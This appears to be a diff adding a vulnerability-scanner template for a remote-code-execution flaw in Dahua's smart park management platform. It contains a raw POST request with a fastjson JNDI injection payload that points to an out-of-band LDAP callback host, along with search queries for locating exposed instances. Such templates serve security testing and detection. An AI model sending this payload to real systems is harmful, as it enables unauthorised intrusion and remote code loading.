@@ -1,0 +1,32 @@
+id: dahua-wpms-sendFaceInfo-rce
+
+info:
+  name: 大华智慧园区综合管理平台 sendFaceInfo - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    hunter-query: app.name="Dahua 大华 智慧园区管理平台"
+  tags: dahua,oob,wpms,rce
+
+http:
+  - raw:
+      - |
+        POST /CardSolution/card/face/sendFaceInfo HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=UTF-8
+        Content-Length: 217
+
+        {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}
+    
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the HTTP Interaction
+        words:
+          - 'dns'
+          - 'smtp'
+        condition: or
